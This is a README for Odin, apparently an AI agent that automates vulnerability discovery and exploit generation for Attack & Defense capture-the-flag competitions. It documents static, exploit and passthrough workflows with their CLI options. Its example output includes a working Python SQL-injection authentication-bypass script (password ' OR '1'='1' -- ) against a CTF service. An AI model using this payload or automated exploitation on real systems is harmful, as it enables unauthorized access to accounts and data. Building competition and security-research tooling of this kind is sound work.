# Odin

Odin is a cybersecurity AI agent that automates the process of finding and exploiting vulnerabilities in source code. It is designed to be used for Attack & Defense style competitions.

## Terminology

- **Workflow**: A top-level analysis orchestration (e.g., static, overview, exploit) that configures an agent with specific prompts, tools, and objectives.
- **Environment**: The runtime container context with optional docker-compose service deployment, providing tool helpers and exec utilities.

## Setup

You can simply install odin as a CLI package using pip:
```sh
pip install git+ssh://git@github.com/us-cyber-team/odin.git
```

Ensure thought you have built the docker image for the base container. You can do this by running:
```sh
docker build -t odin-base docker/
```

Ensure that an OpenAI API key is set in the environment variable `OPENAI_API_KEY`:
```sh
export OPENAI_API_KEY="sk-..."
```

## Usage

You can trigger the agent by running the `odin` command.

```sh
$ odin --help
usage: odin [-h] [-W {clientlib,dummy,exploit,overview,passthrough,static}] [--deploy-service] [--compose-file COMPOSE_FILE]
            [--log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}]
            code_path

Odin: AI-powered vulnerability analysis for security competitions

positional arguments:
  code_path             Path to the codebase to analyze

options:
  -h, --help            show this help message and exit
  -W {clientlib,dummy,exploit,overview,passthrough,static}, --workflow {clientlib,dummy,exploit,overview,passthrough,static}
                        Analysis workflow to run (default: static)
  --deploy-service      Deploy services via docker-compose if available (auto-detect compose when not provided).
  --compose-file COMPOSE_FILE
                        Path to docker-compose file (used when --deploy-service is set)
  --log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}
                        Logging level (default: INFO)
```

### Static Analysis Workflow

Given a directory of code, Odin will run a static analysis on the codebase and return a list of potential vulnerabilities. It will also generate a report with the findings in a json format.
Static Analysis will not trigger any docker containers of the service but it will trigger the base container to run the analysis.
Only reasoning models are supported for static analysis at the moment since we are enabling higher level reasoning (`o4-mini` or `o3` are recommended).

```sh
$ odin -W static --help
usage: odin [-h] [-W {clientlib,dummy,exploit,overview,passthrough,static}] [--output-findings OUTPUT_FINDINGS] [--output-trace OUTPUT_TRACE]
            [--model MODEL] [--reasoning-effort REASONING_EFFORT] [--max-steps MAX_STEPS] [--deploy-service] [--compose-file COMPOSE_FILE]
            [--log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}]
            code_path

Odin: AI-powered vulnerability analysis for security competitions

positional arguments:
  code_path             Path to the codebase to analyze

options:
  -h, --help            show this help message and exit
  -W {clientlib,dummy,exploit,overview,passthrough,static}, --workflow {clientlib,dummy,exploit,overview,passthrough,static}
                        Analysis workflow to run (default: static)
  --deploy-service      Deploy services via docker-compose if available (auto-detect compose when not provided).
  --compose-file COMPOSE_FILE
                        Path to docker-compose file (used when --deploy-service is set)
  --log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}
                        Logging level (default: INFO)

static workflow options:
  --output-findings OUTPUT_FINDINGS
                        Path to save findings (default: findings.json)
  --output-trace OUTPUT_TRACE
                        Output file for the agent's trace
  --model MODEL         OpenAI model to use (default: gpt-5-mini)
  --reasoning-effort REASONING_EFFORT
                        Reasoning effort level (low, medium, high)
  --max-steps MAX_STEPS
                        Maximum number of steps for the agent (default: 150)
```

Example:
```sh
$ odin -W static /path/to/code --output-findings findings.json
```

```sh
$ odin -W static services/ICC2023-AD-CTF/services/SeaOfHackerz/ --output-findings findings.json
```

Example output:
```json
[
  {
    "title": "SQL Injection in Login Route",
    "description": "The `/api/login` endpoint in `app.py` constructs its SQL query by interpolating the username and password directly into the SQL string:\n    cur.execute(\"SELECT * from users WHERE username = '%s' AND password = '%s'\" %\n                (data[\"username\"], data[\"password\"]))\nAn attacker can supply crafted credentials to execute arbitrary SQL, bypass authentication, or extract data. Use parameterized queries (as elsewhere in the code) to fix this.",
    "path": "/opt/resources/backend/app.py",
    "severity": 9
  },
  ...
]
```

### Exploit Generation

This mode isn't fully iterated yet, but the idea is to generate an exploit for a given vulnerability. This will trigger the base container and the service container for the agent to generate an exploit.
The idea is that the agent will be able to test their PoC against the service and see if it works. Use `web` as base of the url, and the port is the exposed port of the service.
Before running this, find the port of the service that runs. The current state only allows for a signle port/target to be specified.

```sh
$ odin -W exploit --help
usage: odin [-h] [-W {clientlib,dummy,exploit,overview,passthrough,static}] --vuln VULN [--output-report OUTPUT_REPORT] [--output-trace OUTPUT_TRACE]
            [--model MODEL] [--reasoning-effort REASONING_EFFORT] [--max-steps MAX_STEPS] [--flag-id FLAG_ID] [--service-ip SERVICE_IP]
            [--flag-regex FLAG_REGEX] [--deploy-service] [--compose-file COMPOSE_FILE] [--log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}]
            code_path

Odin: AI-powered vulnerability analysis for security competitions

positional arguments:
  code_path             Path to the codebase to analyze

options:
  -h, --help            show this help message and exit
  -W {clientlib,dummy,exploit,overview,passthrough,static}, --workflow {clientlib,dummy,exploit,overview,passthrough,static}
                        Analysis workflow to run (default: static)
  --deploy-service      Deploy services via docker-compose if available (auto-detect compose when not provided).
  --compose-file COMPOSE_FILE
                        Path to docker-compose file (used when --deploy-service is set)
  --log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}
                        Logging level (default: INFO)

exploit workflow options:
  --vuln VULN           Description of the vulnerability to analyze
  --output-report OUTPUT_REPORT
                        Path to save the output of the exploit report
  --output-trace OUTPUT_TRACE
                        Output file for the agent's trace
  --model MODEL         OpenAI model to use (default: gpt-5)
  --reasoning-effort REASONING_EFFORT
                        Reasoning effort level (low, medium, high)
  --max-steps MAX_STEPS
                        Maximum number of steps for the agent (default: 150)
  --flag-id FLAG_ID     Flag ID for testing
  --service-ip SERVICE_IP
                        Service IP
  --flag-regex FLAG_REGEX
                        Flag regex
```

We can either specify the vulnerability description or copy it from the findings.json file generated from the static analysis:

```sh
$ odin -W exploit --vuln "example" --deploy-service "http://web:80" --output-path exploit.py
```

```sh
odin -W exploit --log-level DEBUG services/ICC2023-AD-CTF/services/SeaOfHackerz/ --vuln "{\"title\":\"SQL Injection in Login Route\",\"description\":\"The `/api/login` endpoint in `app.py` constructs its SQL query by interpolating the username and password directly into the SQL string:\\n    cur.execute(\\\"SELECT * from users WHERE username = '%s' AND password = '%s'\\\" %\\n                (data[\\\"username\\\"], data[\\\"password\\\"]))\\nAn attacker can supply crafted credentials to execute arbitrary SQL, bypass authentication, or extract data. Use parameterized queries (as elsewhere in the code) to fix this.\",\"path\":\"/opt/resources/backend/app.py\",\"severity\":9}" --deploy-service "http://web:80" --output-path exploit.py
```

Output:
```python
import requests

def exploit():
    s = requests.Session()
    base = "http://web:80"

    # 1. Register a victim user
    rv = s.post(f"{base}/api/users", json={
        "username": "victim",
        "password": "victimpass"
    })
    if rv.status_code not in (200,201):
        print("[-] Failed to register victim:", rv.status_code, rv.text)
        return
    victim_id = rv.json().get("user_id")
    print(f"[+] Victim registered with id = {victim_id}")

    # 2. Register an attacker user
    ra = s.post(f"{base}/api/users", json={
        "username": "attacker",
        "password": "attackerpass"
    })
    if ra.status_code not in (200,201):
        print("[-] Failed to register attacker:", ra.status_code, ra.text)
        return
    attacker_id = ra.json().get("user_id")
    print(f"[+] Attacker registered with id = {attacker_id}")

    # 3. SQL injection in login to bypass authentication as 'attacker'
    payload = {
        "username": "attacker",
        "password": "' OR '1'='1' -- "
    }
    rl = s.post(f"{base}/api/login", json=payload)
    if rl.status_code != 200 or rl.json().get("status") != "ok":
        print("[-] Injection login failed:", rl.status_code, rl.text)
        return
    print("[+] Injection login succeeded, session cookie:", s.cookies.get("session"))

    # 4. Use the stolen session to call a protected endpoint
    #    (attacker starts an attack against the victim)
    rs = s.post(f"{base}/api/users/{victim_id}/attack/start")
    if rs.status_code == 200 and rs.json().get("status") == "ok":
        attack_id = rs.json().get("attack_id")
        print(f"[+] Attack started successfully! attack_id = {attack_id}")
    else:
        print("[-] Attack start failed:", rs.status_code, rs.text)

if __name__ == "__main__":
    exploit()
```

### Passthrough Workflow

This workflow is designed to run a passthrough directly to the LLM agent. It will not trigger any docker containers of the service but it will trigger the base container to run the analysis.
The idea is to run a prompt directly to the LLM agent to ask it questions about the codebase. This is useful for asking general questions and getting a response back in 1-2 minutes generally about codebase.

```sh
$ odin -W passthrough services/ICC2023-AD-CTF/services/SeaOfHackerz/ --help
usage: odin [-h] [-W {clientlib,dummy,exploit,overview,passthrough,static}] [--prompt PROMPT] [--task-file TASK_FILE] [--output-trace OUTPUT_TRACE]
            [--model MODEL] [--reasoning-effort REASONING_EFFORT] [--max-steps MAX_STEPS] [--deploy-service] [--compose-file COMPOSE_FILE]
            [--log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}]
            code_path

Odin: AI-powered vulnerability analysis for security competitions

positional arguments:
  code_path             Path to the codebase to analyze

options:
  -h, --help            show this help message and exit
  -W {clientlib,dummy,exploit,overview,passthrough,static}, --workflow {clientlib,dummy,exploit,overview,passthrough,static}
                        Analysis workflow to run (default: static)
  --deploy-service      Deploy services via docker-compose if available (auto-detect compose when not provided).
  --compose-file COMPOSE_FILE
                        Path to docker-compose file (used when --deploy-service is set)
  --log-level {DEBUG,INFO,WARNING,ERROR,CRITICAL}
                        Logging level (default: INFO)

passthrough workflow options:
  --prompt PROMPT       Prompt to send to the agent
  --task-file TASK_FILE
                        Task file to read instead of prompt
  --output-trace OUTPUT_TRACE
                        Output file for the agent's trace
  --model MODEL         OpenAI model to use (default: gpt-5)
  --reasoning-effort REASONING_EFFORT
                        Reasoning effort level (low, medium, high)
  --max-steps MAX_STEPS
                        Maximum number of steps for the agent (default: 150)
```

We just need to specify the prompt and the code path. The prompt is a string that will be sent to the agent directly.

```sh
$ odin -W passthrough services/ICC2023-AD-CTF/services/SeaOfHackerz/ --prompt "Analyze authentication scheme and describe it in great detail"
```

Output:
```
Authentication Scheme Analysis
==============================

This document provides a detailed breakdown of the custom authentication/session scheme implemented
in `backend/app.py`, along with an assessment of its security properties, identified vulnerabilities,
and recommended mitigations.

1. Login Flow
-------------
Endpoint:
  POST /api/login

Request:
  JSON body containing:
    {
      "username": "<clear-text username>",
      "password": "<clear-text password>"
    }

Server-side logic:
  1. Read raw request body and parse JSON (`data = json.loads(request.data)`).
...
```

## Testing & Iterating

There's some plans to automate the testing and iteration process, but for now, we can load previous services manually and run studies on them.

You can pull the services by running the `pull_services.py` under the `services` directory.